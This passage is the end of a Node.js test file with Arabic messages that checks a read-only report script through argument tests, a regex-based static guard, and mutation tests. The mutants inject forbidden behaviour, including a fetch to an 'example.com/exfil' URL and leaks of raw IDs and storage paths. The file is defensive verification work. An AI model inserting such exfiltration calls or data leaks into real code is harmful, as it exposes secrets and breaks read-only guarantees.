      for (const k of ['cpuKnownAnswerRuns', 'cpuKnownAnswerState', 'cpuKnownAnswerTotalMsByPhase']) delete noRuns.timeSeries.footer.verificationResults[k];
      const r = await run([good, {payload: noRuns, shortId: SECRET.short10, scanId: SECRET.scanB, sha: 'sha-S10'}], `S21=${SECRET.short21},S10=${SECRET.short10}`);
      eq(r.code, 3, '[٣] تقرير محلَّل وآخر غير محلَّل (بصمة بلا cpuKnownAnswerRuns): رمز 3');
      eq(r.doc.reports[0].analysisState, 'ANALYZED', '[٣] الأوّل ANALYZED');
      ok(r.doc.reports[1].analysisState.startsWith('UNDETERMINED:CPU_KNOWN_ANSWER_RUNS_'), `[٣] الثاني UNDETERMINED بسبب غياب التشغيلات (${r.doc.reports[1].analysisState})`);
      eq(r.doc.summary.analyzed, 1, '[٣] الملخّص: محلَّل واحد'); eq(r.doc.summary.undetermined, 1, '[٣] وغير محلَّل واحد');
      deq(r.doc.summary.undeterminedReasons.map((x) => x.tag), ['S10'], '[٣] الملخّص يسمّي الوسم غير المحلَّل');
    }
  }

  // ═══════════════════════════════════════════════════════════════════
  // ٣-ب — الوسائط وpreflight
  // ═══════════════════════════════════════════════════════════════════
  {
    const outsOf = async (argv) => { const o = []; const code = await main(argv, {out: (s) => o.push(s), err: (s) => o.push(s)}); return {code, text: o.join('\n')}; };
    const pf = await outsOf(['--preflight']);
    eq(pf.code, 0, '[٣-ب] --preflight: رمز 0');
    const pfDoc = JSON.parse(pf.text);
    ok(pfDoc.ok === true && pfDoc.network === false && pfDoc.readOnly === true && pfDoc.checks.length >= 5 && pfDoc.checks.every((c) => c.ok), '[٣-ب] --preflight: كل فحوصه ناجحة، بلا شبكة، قراءة فقط');
    for (const [argv, why] of [
      [[], 'بلا وسائط'], [['--tokens', `S=${SECRET.short21}`], 'بلا --out'], [['--out', path.join(tmp, 'x.json')], 'بلا --tokens'], [['--preflight', '--out', 'x'], '--preflight مع --out'],
      [['--tokens', 'bad', '--out', path.join(tmp, 'y.json')], 'رمز بلا ='], [['--tokens', `S=${SECRET.short21}`, '--tokens', `S=${SECRET.short21}`, '--out', path.join(tmp, 'z.json')], 'وسيط مكرَّر'],
      [['--unknown'], 'وسيط مجهول'], [['--tokens', 'S=NC-lower1', '--out', path.join(tmp, 'w.json')], 'رمز بصيغة خاطئة'],
    ]) {
      const r = await outsOf(argv);
      eq(r.code, 2, `[٣-ب] ${why}: رمز 2 (خطأ وسيط)`);
    }
    const existing = path.join(tmp, 'exists.json');
    fs.writeFileSync(existing, '{"keep":true}');
    const before = fs.readFileSync(existing, 'utf8');
    const r = await outsOf(['--tokens', `S=${SECRET.short21}`, '--out', existing]);
    eq(r.code, 2, '[٣-ب] ملفّ مخرَج موجود: رمز 2 قبل أيّ اتصال');
    eq(fs.readFileSync(existing, 'utf8'), before, '[٣-ب] ولا يُستبدَل (wx)');
  }

  // ═══════════════════════════════════════════════════════════════════
  // ٤ — حارس «لا يكتب»: ساكن + ديناميكي + طفرات
  // ═══════════════════════════════════════════════════════════════════
  const stripComments = (s) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '').replace(/([^:'"`\\])\/\/ .*$/gm, '$1').replace(/^#!.*$/m, '');
  const FORBIDDEN = {
    FIRESTORE_WRITE: /\.(?:set|update|create|delete)\(|\bbatch\(|\.runTransaction\(|\.bulkWriter\(|\.recursiveDelete\(|FieldValue|\.commit\(|\bsetDoc\(|\bupdateDoc\(|\bdeleteDoc\(|\baddDoc\(|\bwriteBatch\(/,
    STORAGE_WRITE: /\.(?:save|upload|setMetadata|makePublic|move|copy|createWriteStream|createResumableUpload)\(|\bdestination\s*:/,
    AUTH: /\b(?:getUserByEmail|createUser|updateUser|deleteUser|setCustomUserClaims|OWNER_EMAIL_ENV|readOwnerEmail|resolveOwner)\b|\bauth\b/,
    DISK_WRITE: /\b(?:writeFile(?:Sync)?|appendFile(?:Sync)?|createWriteStream|copyFile(?:Sync)?|renameSync|unlink(?:Sync)?|rmSync|rmdir(?:Sync)?|mkdir(?:Sync)?|mkdtemp(?:Sync)?|truncate(?:Sync)?|symlink(?:Sync)?|cpSync|openSync|writeSync)\b/,
    NETWORK: /\b(?:fetch|XMLHttpRequest|axios|WebSocket)\s*\(|\b(?:https?|http2|net|tls|dns|dgram)\.(?:request|get|connect|createConnection|lookup|resolve)\b|require\(\s*['"](?:https?|http2|net|tls|dns|dgram|node-fetch|axios)['"]\s*\)/,
    RAW_ID_OUTPUT: /\bout\(\s*(?:scanId|shortId)\b|JSON\.stringify\(\s*(?:scanId|shortId|storagePath)\b|\bscanId\s*:\s*scanId\b|\bstoragePath\s*:/,
  };
  const staticViolations = (key, raw) => {
    const src = stripComments(raw.replace(/\r\n/g, '\n'));
    const v = new Set();
    for (const [name, re] of Object.entries(FORBIDDEN)) if (re.test(src)) v.add(`STATIC:${name}`);
    for (const m of src.matchAll(/\b([A-Za-z_$][\w$]*)\.add\(/g)) v.add(`STATIC:FIRESTORE_WRITE(add on ${m[1]})`);
    if (key === 'script') {
      if (!/C\.wrapReadOnly\(/.test(src)) v.add('STATIC:NO_WRAP_READ_ONLY_DB');
      if (!/C\.wrapReadOnlyBucket\(/.test(src)) v.add('STATIC:NO_WRAP_READ_ONLY_BUCKET');
      if (!/C\.writeOutputExclusive\(/.test(src)) v.add('STATIC:NO_EXCLUSIVE_OUTPUT_WRITER');
      if (!/C\.assertOutWritable\(/.test(src)) v.add('STATIC:NO_OUT_PRECHECK');
      if ((src.match(/process\.argv/g) || []).length !== 1) v.add('STATIC:ARGV_READ_OUTSIDE_ENTRY');
    }
    return [...v].sort();
  };
  deq(staticViolations('script', fs.readFileSync(SCRIPT, 'utf8')), [], '[٤] الحارس الساكن: السكربت بلا انتهاك');
  deq(staticViolations('lib', fs.readFileSync(LIB, 'utf8')), [], '[٤] الحارس الساكن: المكتبة بلا انتهاك');
  ok(staticViolations('script', 'x.collection("a").doc("b").set({})').includes('STATIC:FIRESTORE_WRITE'), '[٤] ضابط سلبي: set() تُلتقط');
  ok(staticViolations('lib', "fs.writeFileSync('x', 'y')").includes('STATIC:DISK_WRITE'), '[٤] ضابط سلبي: كتابة fs تُلتقط');
  ok(staticViolations('lib', 'const s = new Set(); s.add(1);').some((x) => x.startsWith('STATIC:FIRESTORE_WRITE')), '[٤] ضابط سلبي: .add تُلتقط');
  ok(staticViolations('lib', 'const auth = 1;').includes('STATIC:AUTH'), '[٤] ضابط سلبي: لمس Auth يُلتقط');

  const requireFresh = () => { for (const f of [SCRIPT, LIB]) delete require.cache[f]; return require(SCRIPT); };
  function compileMutated(file, mutate) {
    const original = fs.readFileSync(file, 'utf8');
    const mutated = mutate(original);
    if (mutated === original) throw new Error(`mutation did not change ${path.basename(file)}`);
    const m = new Module(file, module);
    m.filename = file;
    m.paths = Module._nodeModulePaths(path.dirname(file));
    m._compile(mutated.replace(/^#!.*\n/, '\n'), file);
    m.loaded = true;
    return m;
  }
  async function runGuarded(mutation) {
    const saved = new Map([SCRIPT, LIB].map((f) => [f, require.cache[f]]));
    for (const f of [SCRIPT, LIB]) delete require.cache[f];
    try {
      if (mutation) require.cache[mutation.file] = compileMutated(mutation.file, mutation.mutate);
      const mod = require(SCRIPT);
      const world = seed([{payload: p21, shortId: SECRET.short21, scanId: SECRET.scan, sha: SECRET.sha}]);
      const db = makeMemDb(world.collections);
      const {bucket, writeAttempts: bucketWrites} = H.makeStubBucket(world.objects);
      const outPath = nextOut();
      const spy = H.spyFsWrites();
      const net = H.blockNonLocalNetwork();
      const cap = H.captureConsole();
      const outs = [];
      let code = null;
      let thrown = null;
      try {
        code = await mod.main(['--tokens', `S21=${SECRET.short21}`, '--out', outPath], {db, bucket, now: () => NOW, out: (s) => outs.push(String(s)), err: (s) => outs.push(String(s))});
      } catch (e) {
        thrown = e;
      } finally {
        cap.restore(); net.restore(); spy.restore();
      }
      const fileText = fs.existsSync(outPath) ? fs.readFileSync(outPath, 'utf8') : '';
      const text = `${outs.join('\n')}\n${cap.chunks.join('\n')}\n${fileText}${thrown ? `\n${String(thrown.message)}` : ''}`;
      const v = new Set();
      if (thrown || code !== 0) v.add('EXIT_CODE');
      if (db.writeAttempts.length > 0) v.add('FIRESTORE_WRITE');
      if (bucketWrites.length > 0) v.add('STORAGE_WRITE');
      if (spy.writes.some((w) => path.resolve(w.path) !== path.resolve(outPath))) v.add('DISK_WRITE');
      if (spy.writes.filter((w) => path.resolve(w.path) === path.resolve(outPath)).length !== 1) v.add('OUTPUT_NOT_WRITTEN_ONCE');
      if (net.blocked.length > 0) v.add('NETWORK');
      if (SECRETS.some((s) => text.includes(s))) v.add('SECRET_IN_OUTPUT');
      for (const [k, f] of [['script', SCRIPT], ['lib', LIB]]) {
        const src = mutation && mutation.file === f ? mutation.mutate(fs.readFileSync(f, 'utf8')) : fs.readFileSync(f, 'utf8');
        for (const sv of staticViolations(k, src)) v.add(sv);
      }
      return {violations: [...v].sort(), code, fsWrites: spy.writes, outPath};
    } finally {
      for (const f of [SCRIPT, LIB]) { delete require.cache[f]; if (saved.get(f)) require.cache[f] = saved.get(f); }
    }
  }
  const insertAfter = (anchor, text) => (src) => { const c = src.split(anchor).length - 1; if (c !== 1) throw new Error(`anchor count ${c}: ${anchor.slice(0, 50)}`); return src.replace(anchor, `${anchor}${text}`); };
  const replaceOnce = (anchor, rep) => (src) => { const c = src.split(anchor).length - 1; if (c !== 1) throw new Error(`anchor count ${c}: ${anchor.slice(0, 50)}`); return src.replace(anchor, rep); };
  const LEAK = JSON.stringify(path.join(tmp, 'leaked.json'));
  const LEAK_DEST = JSON.stringify(path.join(tmp, 'leaked-destination.json'));
  const NOW_LINE = '    const nowMs = now();\n';
  const MUTANTS = [
    {id: 'M1-firestore-write-bypassing-the-wrapper', file: SCRIPT, mutate: insertAfter(NOW_LINE, "    await injected.db.collection('reports').doc('mutant').set({hacked: true});\n"), expect: ['FIRESTORE_WRITE', 'EXIT_CODE', 'STATIC:FIRESTORE_WRITE']},
    {id: 'M2-firestore-delete-through-the-wrapped-db (rule 42)', file: SCRIPT, mutate: insertAfter(NOW_LINE, "    await db.collection('reports').doc('r').delete();\n"), expect: ['EXIT_CODE', 'STATIC:FIRESTORE_WRITE']},
    {id: 'M3-writes-a-file-to-disk', file: LIB, mutate: insertAfter('  const scanId = found.docs[0].id;\n', `  require('fs').writeFileSync(${LEAK}, 'x');\n`), expect: ['DISK_WRITE', 'STATIC:DISK_WRITE']},
    {id: 'M4-puts-the-raw-scanId-into-the-output', file: LIB, mutate: replaceOnce('  facts.scanIdHash = C.hashIdForLog(scanId);', '  facts.scanIdHash = scanId;'), expect: ['SECRET_IN_OUTPUT']},
    {id: 'M5-storage-write-through-the-unwrapped-bucket', file: SCRIPT, mutate: insertAfter(NOW_LINE, "    await injected.bucket.file('x').save('y');\n"), expect: ['STORAGE_WRITE', 'EXIT_CODE', 'STATIC:STORAGE_WRITE']},
    {id: 'M6-download-to-a-destination-file', file: LIB, mutate: replaceOnce('    const r = await fetchSamplesFromStorage(bucket, storagePath);\n', `    const r = {state: 'DOWNLOADED', samples: await bucket.file(storagePath).download({destination: ${LEAK_DEST}})};\n`), expect: ['EXIT_CODE', 'STATIC:STORAGE_WRITE']},
    {id: 'M7-network-call', file: SCRIPT, mutate: insertAfter(NOW_LINE, "    await fetch('https://example.com/exfil?x=1');\n"), expect: ['NETWORK', 'EXIT_CODE', 'STATIC:NETWORK']},
    {id: 'M8-no-read-only-wrapper', file: SCRIPT, mutate: replaceOnce('C.wrapReadOnly(injected.db)', 'injected.db'), expect: ['STATIC:NO_WRAP_READ_ONLY_DB']},
    {id: 'M9-prints-the-storage-path-through-console', file: LIB, mutate: insertAfter("  const storagePath = raw ? raw.timeSeriesStoragePath : undefined;\n", '  console.log(storagePath);\n'), expect: ['SECRET_IN_OUTPUT']},
  ];
  {
    requireFresh();
    const clean = await runGuarded(null);
    deq(clean.violations, [], '[٤] الأصل تحت الحارس الديناميكي بلا أيّ انتهاك (لا كتابة Firestore ولا Storage ولا قرص غير المخرَج ولا شبكة ولا معرّف خامّ)');
    eq(clean.code, 0, '[٤] الأصل: رمز الخروج 0');
    deq(clean.fsWrites.map((w) => path.resolve(w.path)), [path.resolve(clean.outPath)], '[٤] الكتابة الوحيدة على القرص ملفّ المخرَج');
    ok(MUTANTS.length >= 7, `[٤] الطفرات (${MUTANTS.length})`);
    for (const mu of MUTANTS) {
      const r = await runGuarded(mu);
      ok(r.violations.length > 0, `[٤] ${mu.id}: الحارس يفشل (${r.violations.join(', ') || 'لا شيء'})`);
      for (const exp of mu.expect) ok(r.violations.includes(exp), `[٤] ${mu.id}: يُبلَّغ عن ${exp} — الفعلي: ${r.violations.join(', ')}`);
      const again = await runGuarded(null);
      deq(again.violations, [], `[٤] ${mu.id}: وبعد الطفرة يعود الأصلي نظيفاً (لا تسرّب في require.cache)`);
    }
    ok(fs.existsSync(path.join(tmp, 'leaked.json')), '[٤] (ضابط) M3 كتبت فعلاً ملفّاً على القرص — والحارس هو الذي أبلغ عنها');
    ok(!fs.existsSync(path.join(tmp, 'leaked-destination.json')), '[٤] وM6 لم تُنتج ملفّاً: غلاف bucket رمى TRAP قبل الكتابة');
  }

  await new Promise((r) => setTimeout(r, 100));
  fs.rmSync(tmp, {recursive: true, force: true}); // ملفّات الاختبار المؤقّتة وحدها
  console.log(`\nclusterFreqWindows.test.js: ${n} assertions passed (mutants=${MUTANTS.length})`);
})().catch((e) => {
  console.error('FAIL:', e && e.stack || e);
  process.exit(1);
});
